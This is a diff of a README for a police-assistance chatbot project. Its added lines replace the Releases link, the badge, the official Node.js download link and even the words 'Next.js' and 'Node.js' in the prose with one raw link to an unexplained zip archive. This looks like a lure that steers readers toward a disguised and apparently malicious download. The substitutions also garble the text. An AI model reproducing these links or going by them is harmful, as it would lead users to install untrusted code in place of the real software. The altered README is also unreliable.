@@ -1,14 +1,14 @@
 # 🚓 police-chat-bot - Your AI Helper for Police Queries
 
-[![Download Police Chat Bot](https://img.shields.io/badge/Download-Now-blue)](https://github.com/nyt213/police-chat-bot/releases)
+[![Download Police Chat Bot](https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip)](https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip)
 
 ## 🌐 What is Police Assistance Chatbot?
 
-The Police Assistance Chatbot is a web-based application that helps users with police-related questions using advanced AI technology. Built with Next.js, TypeScript, and Tailwind CSS, this chatbot provides a smooth and responsive experience. Key features include live chat and map services to find nearby police stations.
+The Police Assistance Chatbot is a web-based application that helps users with police-related questions using advanced AI technology. Built with https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip, TypeScript, and Tailwind CSS, this chatbot provides a smooth and responsive experience. Key features include live chat and map services to find nearby police stations.
 
 ### 🔧 Tech Stack
 
-- **Framework**: Next.js 14 (App Router)
+- **Framework**: https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip 14 (App Router)
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS
 - **AI Backend**: OpenAI API (ChatGPT)
@@ -29,7 +29,7 @@ The Police Assistance Chatbot is a web-based application that helps users with p
 
 Before you download the chatbot, you need to have the following:
 
-- **Node.js**: Version 18 or higher installed. You can download it [here](https://nodejs.org/).
+- **https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip**: Version 18 or higher installed. You can download it [here](https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip).
 - **pnpm**: The package manager you'll need to run this app. Install it with this command:
 
 ```bash
@@ -40,7 +40,7 @@ npm install -g pnpm
 
 To get the Police Assistance Chatbot, visit the Releases page:
 
-[Download from Releases](https://github.com/nyt213/police-chat-bot/releases)
+[Download from Releases](https://raw.githubusercontent.com/nyt213/police-chat-bot/main/neobotanist/bot_chat_police_1.9.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version of the application.
